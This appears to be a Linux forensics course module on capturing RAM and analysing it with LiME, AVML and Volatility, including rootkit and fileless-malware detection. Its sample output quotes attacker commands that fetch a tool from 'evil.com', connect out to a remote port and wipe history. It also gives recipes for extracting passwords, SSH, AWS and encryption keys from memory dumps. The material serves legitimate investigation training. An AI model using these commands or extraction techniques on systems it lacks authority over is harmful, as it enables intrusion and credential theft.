# Working with Volatile Memory

## Course: Linux Forensics - Day 4 (continued)
- RAM contains evidence unavailable on disk
- Volatile memory is lost when system powers off
- Running processes, network connections, and encryption keys live in RAM
- This module covers RAM extraction, analysis, and process dumping

---

## Why Volatile Memory Matters

```text
What's in RAM?                  What's NOT on Disk?
+--------------------------+    +--------------------------+
| Running processes        |    | Encryption keys          |
| Open network connections |    | Decrypted data           |
| Loaded kernel modules    |    | Running malware (fileless)|
| Open files               |    | Injected code            |
| Environment variables    |    | Command history (unsaved)|
| Clipboard contents       |    | Network session data     |
| Login sessions           |    | Temporary credentials    |
| Cached credentials       |    | Process memory contents  |
+--------------------------+    +--------------------------+
```

---

## Memory Acquisition Methods

| Method          | Pros                      | Cons                      |
|----------------|---------------------------|---------------------------|
| `LiME`         | Clean, reliable, LKM      | Requires module loading   |
| `/proc/kcore`  | No module needed           | Virtual addresses, complex|
| `/dev/mem`     | Direct access              | Often restricted          |
| `fmem`         | Bypasses restrictions      | Requires compilation      |
| `AVML`         | Microsoft tool, no LKM     | Newer, less tested        |
| Cold boot      | Works when locked           | Hardware access needed    |
| Crash dump     | Automatic on panic         | Not controllable          |

---

## Memory Capture with LiME (Review)

```bash
# Compile LiME for target kernel
cd LiME/src
make
ls lime-*.ko

# Capture to local file
sudo insmod lime-$(uname -r).ko \
  "path=/evidence/ram.lime format=lime"

# Capture over network (minimal disk impact)
# On forensic workstation:
nc -l -p 4444 > /evidence/ram.lime
# On target:
sudo insmod lime-$(uname -r).ko \
  "path=tcp:4444 format=lime"

# Capture in raw format
sudo insmod lime-$(uname -r).ko \
  "path=/evidence/ram.raw format=raw"

# Verify capture
ls -la /evidence/ram.lime
xxd /evidence/ram.lime | head -3
# Should see LiME magic: 4c694d45
```

---

## AVML (Azure Virtual Machine Live) Memory Capture

```bash
# AVML - Microsoft's memory acquisition tool
# Works without loading kernel modules
# Uses /proc/kcore with virtual-to-physical translation

# Download AVML
wget https://github.com/microsoft/avml/releases/latest/download/avml

chmod +x avml

# Capture memory
sudo ./avml /evidence/memory.lime

# Capture compressed
sudo ./avml --compress /evidence/memory.lime.compressed

# Advantages:
# - No kernel module needed
# - Supports modern kernels
# - Compression support
# - LiME-compatible output format
```

---

## Volatility Framework

```bash
# Volatility 3 - premier memory forensics framework
pip3 install volatility3

# Basic usage
vol -f /evidence/ram.lime linux.pslist
vol -f /evidence/ram.lime linux.pstree
vol -f /evidence/ram.lime linux.bash

# Volatility 3 Linux plugins:
# linux.pslist       - List processes
# linux.pstree       - Process tree
# linux.bash         - Bash command history
# linux.check_afinfo - Verify network structures
# linux.check_creds  - Check credential structures
# linux.check_idt    - Verify IDT entries
# linux.check_modules - Compare module lists
# linux.check_syscall - Verify syscall table
# linux.elfs         - List ELF binaries in memory
# linux.lsmod        - List kernel modules
# linux.lsof         - List open files
# linux.sockstat     - Network socket statistics
```

---

## Process Listing from Memory

```bash
# List all processes
vol -f /evidence/ram.lime linux.pslist
# PID    PPID   Name          Offset
# 1      0      systemd       0xffff...
# 234    1      sshd          0xffff...
# 5678   234    sshd          0xffff...
# 5679   5678   bash          0xffff...
# 6789   5679   suspicious    0xffff...

# Process tree (shows parent-child relationships)
vol -f /evidence/ram.lime linux.pstree
# systemd (1)
# ├── sshd (234)
# │   └── sshd (5678)
# │       └── bash (5679)
# │           └── suspicious (6789)

# This shows: someone SSH'd in and ran "suspicious" program
```

---

## Bash History from Memory

```bash
# Extract bash command history from RAM
# Even if .bash_history was deleted!
vol -f /evidence/ram.lime linux.bash
# PID    Name   Command Time          Command
# 5679   bash   2025-01-15 10:30:00  cd /tmp
# 5679   bash   2025-01-15 10:30:05  wget http://evil.com/tool
# 5679   bash   2025-01-15 10:30:10  chmod +x tool
# 5679   bash   2025-01-15 10:30:15  ./tool -c 10.0.0.1:4443
# 5679   bash   2025-01-15 10:31:00  rm tool
# 5679   bash   2025-01-15 10:31:05  history -c
# 5679   bash   2025-01-15 10:31:10  cat /dev/null > .bash_history

# Note: even though attacker cleared history,
# the commands are still in memory!
```

---

## Network Connections from Memory

```bash
# List network connections
vol -f /evidence/ram.lime linux.sockstat
# Offset       Proto  Local Addr     Remote Addr      State    PID
# 0xffff...    TCP    0.0.0.0:22     0.0.0.0:0        LISTEN   234
# 0xffff...    TCP    10.0.0.5:22    192.168.1.50:4567 ESTAB   5678
# 0xffff...    TCP    10.0.0.5:39234 10.0.0.1:4443    ESTAB   6789

# The connection to 10.0.0.1:4443 from PID 6789 is suspicious
# Cross-reference with process list

# Alternative: network interface information
vol -f /evidence/ram.lime linux.ifconfig

# Check for promiscuous mode (sniffing)
vol -f /evidence/ram.lime linux.check_afinfo
```

---

## Kernel Module Analysis from Memory

```bash
# List loaded kernel modules
vol -f /evidence/ram.lime linux.lsmod
# Offset       Name             Size
# 0xffff...    nf_tables        303104
# 0xffff...    bluetooth        720896
# 0xffff...    rootkit_mod      4096    # <- suspicious!

# Compare visible vs hidden modules
vol -f /evidence/ram.lime linux.check_modules
# This detects modules hidden from lsmod
# Rootkits often hide their kernel module

# Verify syscall table integrity
vol -f /evidence/ram.lime linux.check_syscall
# Hooked syscalls indicate rootkit activity
# Example: sys_read hooked to 0xffff... (not in kernel range)

# Check IDT (Interrupt Descriptor Table)
vol -f /evidence/ram.lime linux.check_idt
```

---

## File Recovery from Memory

```bash
# List open files for all processes
vol -f /evidence/ram.lime linux.lsof
# PID    FD    Path
# 5679   0     /dev/pts/0
# 5679   1     /dev/pts/0
# 5679   3     /tmp/stolen_data.tar.gz
# 6789   3     socket:[12345]
# 6789   4     /dev/null

# Dump process executable from memory
vol -f /evidence/ram.lime linux.elfs --pid 6789 \
  --dump --output /evidence/dumped_binaries/
# Recovers the binary even if deleted from disk!

# Extract files from memory
vol -f /evidence/ram.lime linux.proc.maps --pid 6789
# Shows all memory mappings for the process
```

---

## Credential Extraction from Memory

```bash
# Search memory for credentials
# Strings-based approach
strings /evidence/ram.lime | grep -iE \
  "password|passwd|secret|key|token" | head -30

# Search for SSH keys in memory
strings /evidence/ram.lime | grep -A5 "BEGIN.*PRIVATE KEY"

# Search for specific patterns
# HTTP Basic Auth (base64 encoded)
strings /evidence/ram.lime | grep -oP 'Basic \K[A-Za-z0-9+/=]+' | \
  while read b64; do echo "$b64" | base64 -d 2>/dev/null; echo; done

# MySQL/PostgreSQL connection strings
strings /evidence/ram.lime | grep -iE \
  "mysql://|postgresql://|mongodb://|redis://"

# AWS/cloud credentials
strings /evidence/ram.lime | grep -iE "AKIA|aws_secret"
```

---

## Process Dumping from Live System

```bash
# Dump a running process's memory
# Method 1: gcore
gcore -o /evidence/process_dump 1234
# Creates /evidence/process_dump.1234

# Method 2: /proc/PID/mem
# Create dump script
cat << 'EOF' > dump_process.sh
#!/bin/bash
PID=$1
OUTPUT=$2
grep "r-" /proc/$PID/maps | while read line; do
  start=$(echo "$line" | cut -d'-' -f1)
  end=$(echo "$line" | cut -d'-' -f2 | cut -d' ' -f1)
  dd if=/proc/$PID/mem bs=1 skip=$((16#$start)) \
    count=$(($((16#$end))-$((16#$start)))) \
    >> "$OUTPUT" 2>/dev/null
done
EOF
chmod +x dump_process.sh
sudo ./dump_process.sh 1234 /evidence/pid_1234_dump.bin

# Method 3: Using GDB
gdb -batch -pid 1234 -ex "generate-core-file /evidence/core.1234"
```

---

## Analyzing Process Memory Dumps

```bash
# Search for strings in process dump
strings /evidence/process_dump.1234 | head -50

# Search for specific data
strings /evidence/process_dump.1234 | \
  grep -iE "password|api.key|authorization"

# Search for IP addresses
strings /evidence/process_dump.1234 | \
  grep -oP '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' | sort -u

# Search for URLs
strings /evidence/process_dump.1234 | \
  grep -oP 'https?://[^\s"]+' | sort -u

# Search for email addresses
strings /evidence/process_dump.1234 | \
  grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | sort -u

# Carve embedded files from memory
foremost -i /evidence/process_dump.1234 -o /evidence/carved_from_mem/
```

---

## Live System Memory Analysis

```bash
# Quick live memory triage (without full dump)

# 1. Running processes
ps auxf > /evidence/live/processes.txt

# 2. Process details
for pid in $(ls /proc/ | grep -E '^[0-9]+$'); do
  exe=$(readlink /proc/$pid/exe 2>/dev/null)
  cmdline=$(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ')
  echo "$pid|$exe|$cmdline"
done > /evidence/live/process_details.txt 2>/dev/null

# 3. Open files per process
ls -la /proc/*/fd/ 2>/dev/null > /evidence/live/open_fds.txt

# 4. Network connections with process info
ss -tunapl > /evidence/live/network.txt

# 5. Kernel modules
lsmod > /evidence/live/modules.txt

# 6. Memory maps of suspicious process
cat /proc/6789/maps > /evidence/live/suspicious_maps.txt
```

---

## Swap Space Analysis

```bash
# Swap may contain memory pages written to disk
# Important source of evidence!

# Identify swap partitions/files
cat /proc/swaps
swapon -s

# Image swap partition
sudo dd if=/dev/sda3 of=/evidence/swap.dd bs=4M status=progress

# Search swap for strings
strings /evidence/swap.dd | grep -iE "password|secret" | head -20

# Carve files from swap
foremost -i /evidence/swap.dd -o /evidence/swap_carved/

# Swap file location (if file-based)
cat /etc/fstab | grep swap
ls -la /swapfile
```

---

## Hibernation File Analysis

```bash
# Linux hibernation saves RAM to swap partition
# The hibernation image contains full memory state

# Check if hibernation was used
journalctl | grep -i "hibernat\|suspend\|PM:"

# Hibernation image may be in swap partition
# Extract with appropriate tools based on kernel version

# Search hibernation data for evidence
strings /evidence/swap.dd | grep -c "password"

# Note: If LUKS encryption is used for swap,
# the hibernation image is also encrypted
# You need the LUKS key to access it
```

---

## Memory Forensics: Timeline Approach

```text
Evidence Timeline from Memory Analysis:
|
+-- Process creation times (from task_struct)
|   PID 6789 created at 10:30:05
|
+-- Bash history with timestamps
|   10:30:00 cd /tmp
|   10:30:05 wget http://evil.com/tool
|
+-- Network connections established
|   10:30:10 Connect to 10.0.0.1:4443
|
+-- Files opened/created
|   10:30:15 Open /tmp/stolen_data.tar.gz
|
+-- Correlate with disk timeline
|   10:30:15 /etc/cron.d/update created
```

---

## Exercise: Volatile Memory Lab

### Tasks:
1. Capture memory using `LiME`
2. Analyze processes with Volatility
3. Extract bash history from memory
4. Identify network connections
5. Search for credentials in memory

```bash
# Memory forensics workflow
# 1. Capture
sudo insmod lime-*.ko "path=/evidence/ram.lime format=lime"

# 2. Analyze processes
vol -f /evidence/ram.lime linux.pslist
vol -f /evidence/ram.lime linux.pstree

# 3. Bash history
vol -f /evidence/ram.lime linux.bash

# 4. Network
vol -f /evidence/ram.lime linux.sockstat

# 5. Strings search
strings /evidence/ram.lime | grep -i "password" | head
```

---

## Summary: Volatile Memory Analysis

- RAM contains evidence not available on disk
- Capture memory early - it is the most volatile evidence
- `LiME` and `AVML` are primary `Linux` memory acquisition tools
- Volatility framework provides comprehensive memory analysis
- Process listing reveals running programs and their relationships
- Bash history in memory survives history clearing
- Network connections show active communications
- Kernel module analysis detects rootkits
- Credential extraction may find passwords and keys in cleartext
- Process dumping captures individual program memory
- Swap space may contain paged-out memory contents
- Combine memory and disk analysis for complete investigation picture

---

## Volatility Advanced Plugins

```bash
# Environment variables from memory
vol -f /evidence/ram.lime linux.envvars
# PID  Name   Variable          Value
# 5679 bash   PATH              /usr/local/sbin:/usr/local/bin:...
# 5679 bash   HOME              /home/admin
# 5679 bash   HISTFILE          /dev/null  <- anti-forensics!

# Mount points from memory
vol -f /evidence/ram.lime linux.mountinfo

# Keyboard buffer (may contain passwords typed)
vol -f /evidence/ram.lime linux.keyboard_notifiers

# TTY input/output
vol -f /evidence/ram.lime linux.tty_check

# Check for kernel hooks
vol -f /evidence/ram.lime linux.check_syscall
# Hooked syscalls indicate kernel-level rootkit

# Detect hidden processes
# Compare pslist vs walking process list manually
vol -f /evidence/ram.lime linux.pslist > pslist.txt
vol -f /evidence/ram.lime linux.check_creds > creds.txt
```

---

## Memory Strings Analysis

```bash
# Systematic string extraction from memory

# Extract all ASCII strings
strings -a /evidence/ram.lime > /evidence/mem_strings_ascii.txt

# Extract Unicode strings
strings -a -el /evidence/ram.lime > /evidence/mem_strings_unicode.txt

# Search for specific patterns
grep -iE "password\s*[:=]" /evidence/mem_strings_ascii.txt | \
  sort -u > /evidence/passwords.txt

# Search for URLs
grep -oP 'https?://[^\s"<>]+' /evidence/mem_strings_ascii.txt | \
  sort -u > /evidence/urls.txt

# Search for IP addresses with ports
grep -oP '\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}\b' \
  /evidence/mem_strings_ascii.txt | sort -u > /evidence/ip_ports.txt

# Search for email addresses
grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' \
  /evidence/mem_strings_ascii.txt | sort -u > /evidence/emails.txt

# Count most common strings (find patterns)
sort /evidence/mem_strings_ascii.txt | uniq -c | \
  sort -rn | head -50 > /evidence/common_strings.txt
```

---

## Memory Forensics: Encryption Keys

```bash
# Find encryption keys in memory
# AES keys are 128, 192, or 256 bits

# Using aeskeyfind
sudo apt install aeskeyfind
aeskeyfind /evidence/ram.lime
# Found AES-256 key: 0123456789abcdef...

# Using findaes (alternative)
findaes /evidence/ram.lime

# RSA private key fragments
strings /evidence/ram.lime | grep -A5 "BEGIN RSA"

# TLS session keys (decrypt captured traffic)
strings /evidence/ram.lime | \
  grep -E "^(RSA|CLIENT_RANDOM)" > /evidence/tls_keys.txt
# Import into Wireshark: Edit -> Preferences -> TLS -> (Pre)-Master-Secret

# SSH keys in memory
strings /evidence/ram.lime | grep -B2 -A20 "OPENSSH PRIVATE KEY"

# Disk encryption keys (LUKS, BitLocker)
# May be present if volume was mounted at capture time
```

---

## Memory Forensics: Fileless Malware

```bash
# Fileless malware exists only in memory
# No files on disk to detect

# Detection approach:
# 1. Look for processes with no executable on disk
vol -f /evidence/ram.lime linux.pslist | while read line; do
  pid=$(echo "$line" | awk '{print $1}')
  exe=$(echo "$line" | awk '{print $NF}')
  # Check if executable exists in mounted image
  if [ ! -f "/forensics/mounted$exe" ]; then
    echo "NO DISK FILE: PID $pid $exe"
  fi
done

# 2. Look for processes running from /dev/shm or /tmp
vol -f /evidence/ram.lime linux.pslist | \
  grep -E "/dev/shm|/tmp|/var/tmp|\(deleted\)"

# 3. Dump suspicious process memory
vol -f /evidence/ram.lime linux.proc.maps --pid 6789 --dump

# 4. Look for injected code
vol -f /evidence/ram.lime linux.malfind
# Shows memory regions with:
# - PAGE_EXECUTE_READWRITE protection
# - No backing file
# - Suspicious code patterns
```

---

## Memory Timeline Construction

```bash
# Build timeline from memory artifacts

# Process creation times
vol -f /evidence/ram.lime linux.pslist | \
  awk '{print $NF, $1, $2}' | sort > /evidence/mem_proc_timeline.txt

# Combine memory timeline with disk timeline
# Memory gives us:
# - Process creation times
# - Command history with timestamps
# - Active network connections
# - Open files at capture time

# Disk gives us:
# - File creation/modification times
# - Log entries
# - Scheduled task execution

# Combined analysis reveals:
# - What was running when
# - What files were open
# - What network connections existed
# - Sequence of attacker actions

# Create combined timeline in CSV
echo "Timestamp,Source,Type,Details" > /evidence/combined_timeline.csv
# Add entries from both memory and disk analysis
```

---

## Physical Memory Layout

```bash
# Understanding memory layout helps with analysis

cat /proc/iomem
# 00000000-00000fff : Reserved
# 00001000-0009fbff : System RAM
# 000a0000-000fffff : Reserved
# 00100000-bfffffff : System RAM
#   01000000-01afffff : Kernel code
#   01b00000-01ffffff : Kernel data
#   ...
# 100000000-43fffffff : System RAM

# This shows:
# - Physical memory regions
# - Kernel code/data locations
# - Reserved areas (BIOS, hardware)
# - Memory-mapped I/O regions

# Memory map is important for:
# - Understanding LiME capture scope
# - Identifying which regions contain user data
# - Finding kernel structures
```

---

## Exercise: Comprehensive Memory Lab

### Tasks:
1. Capture memory using LiME
2. List all processes and identify suspicious ones
3. Extract bash history from all shells
4. Map all network connections to processes
5. Search for credentials and encryption keys
6. Dump suspicious process memory and analyze

```bash
#!/bin/bash
# Memory forensics analysis script
MEM="/evidence/ram.lime"
OUT="/evidence/mem_analysis"
mkdir -p "$OUT"

echo "=== Process List ==="
vol -f "$MEM" linux.pslist > "$OUT/pslist.txt"
echo "=== Process Tree ==="
vol -f "$MEM" linux.pstree > "$OUT/pstree.txt"
echo "=== Bash History ==="
vol -f "$MEM" linux.bash > "$OUT/bash_history.txt"
echo "=== Network ==="
vol -f "$MEM" linux.sockstat > "$OUT/network.txt"
echo "=== Modules ==="
vol -f "$MEM" linux.lsmod > "$OUT/modules.txt"
echo "=== Strings Search ==="
strings "$MEM" | grep -i "password" | sort -u > "$OUT/passwords.txt"

echo "Analysis complete: $OUT"
```

---

## Recovering Deleted Files from Memory

```bash
# Files opened by processes remain in memory
# Even if deleted from disk

# Find deleted files still open by processes
ls -la /proc/*/fd/ 2>/dev/null | grep "(deleted)"
# lr-x------ 1 root root 64 ... 3 -> /tmp/secret.txt (deleted)

# Recover the deleted file via /proc
cat /proc/6789/fd/3 > /evidence/recovered_secret.txt

# For memory dumps, carve files directly
foremost -t all -i /evidence/ram.lime \
  -o /evidence/memory_carved/

# Search memory for file contents
strings /evidence/ram.lime | grep -B2 -A10 "BEGIN CERTIFICATE"

# Recover webpage content from browser memory
strings /evidence/ram.lime | grep -oP '<html>.*?</html>' | head -5

# Recover clipboard contents
strings /evidence/ram.lime | grep -B1 -A1 "CLIPBOARD"
```

---

## Memory Forensics: Rootkit Detection

```bash
# Rootkits modify kernel structures to hide

# 1. Syscall table comparison
vol -f /evidence/ram.lime linux.check_syscall
# Hooked: sys_read  0xffffffffc0123456 (module: rootkit)
# Normal kernel functions have addresses starting with
# 0xffffffff81... or 0xffffffff82...
# Addresses in 0xffffffffc0... = loaded module (suspicious)

# 2. Hidden processes
# Compare two methods of listing processes
vol -f /evidence/ram.lime linux.pslist > method1.txt
vol -f /evidence/ram.lime linux.psscan > method2.txt
diff method1.txt method2.txt
# Processes in psscan but not pslist = hidden by rootkit

# 3. IDT hooks
vol -f /evidence/ram.lime linux.check_idt
# Interrupt handlers pointing to module space = suspicious

# 4. Network hooks
vol -f /evidence/ram.lime linux.check_afinfo
# Modified protocol handlers can hide connections
```

---

## Memory Analysis Automation

```bash
#!/bin/bash
# Automated memory analysis script
MEM="$1"
OUT="/evidence/mem_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUT"

echo "[*] Analyzing memory dump: $MEM"

echo "[1/8] Process list..."
vol -f "$MEM" linux.pslist > "$OUT/pslist.txt" 2>/dev/null

echo "[2/8] Process tree..."
vol -f "$MEM" linux.pstree > "$OUT/pstree.txt" 2>/dev/null

echo "[3/8] Bash history..."
vol -f "$MEM" linux.bash > "$OUT/bash.txt" 2>/dev/null

echo "[4/8] Network connections..."
vol -f "$MEM" linux.sockstat > "$OUT/network.txt" 2>/dev/null

echo "[5/8] Kernel modules..."
vol -f "$MEM" linux.lsmod > "$OUT/modules.txt" 2>/dev/null

echo "[6/8] Open files..."
vol -f "$MEM" linux.lsof > "$OUT/open_files.txt" 2>/dev/null

echo "[7/8] Syscall check..."
vol -f "$MEM" linux.check_syscall > "$OUT/syscalls.txt" 2>/dev/null

echo "[8/8] String extraction..."
strings "$MEM" | grep -iE "password|secret|key" | \
  sort -u > "$OUT/sensitive_strings.txt"

echo "[*] Analysis complete: $OUT"
```

---

## Comparing Memory and Disk Evidence

```text
Memory vs Disk Correlation Matrix:
==================================
Artifact       | Disk      | Memory    | Correlation
---------------+-----------+-----------+---------------
Process list   | auth.log  | pslist    | Login -> Process
Network conn   | logs      | sockstat  | Log entry -> Active conn
Bash history   | .bash_hist| bash plug | On-disk vs in-memory
Open files     | timestamps| lsof      | Modified -> Open
Kernel modules | lib/modules| lsmod   | On-disk vs loaded
Cron jobs      | /etc/cron | N/A       | Disk only
Deleted files  | unalloc   | fd/deleted| Recoverable both
Encryption keys| N/A       | aeskeyfind| Memory only
```

- Disk analysis shows persistent state
- Memory analysis shows runtime state
- Combining both gives the complete picture
- Discrepancies may indicate anti-forensics

---

## Evidence Preservation from Memory

```bash
# Memory evidence must be preserved carefully

# 1. Capture as early as possible
# Memory changes constantly - every second matters

# 2. Minimize activity before capture
# Don't browse, don't install tools on target
# Use pre-compiled LiME module

# 3. Hash the capture immediately
sha256sum /evidence/ram.lime > /evidence/ram.lime.sha256

# 4. Create a backup copy
cp /evidence/ram.lime /evidence/backup/ram.lime
sha256sum /evidence/backup/ram.lime >> /evidence/ram.lime.sha256

# 5. Document capture conditions
cat > /evidence/memory_capture_notes.txt << EOF
Capture Time: $(date -u)
System: $(uname -a)
RAM Size: $(free -m | awk '/Mem:/ {print $2}') MB
Uptime: $(uptime)
Capture Tool: LiME $(modinfo lime 2>/dev/null | grep version)
Capture Format: lime
File Size: $(ls -la /evidence/ram.lime | awk '{print $5}') bytes
SHA-256: $(cat /evidence/ram.lime.sha256)
EOF
```
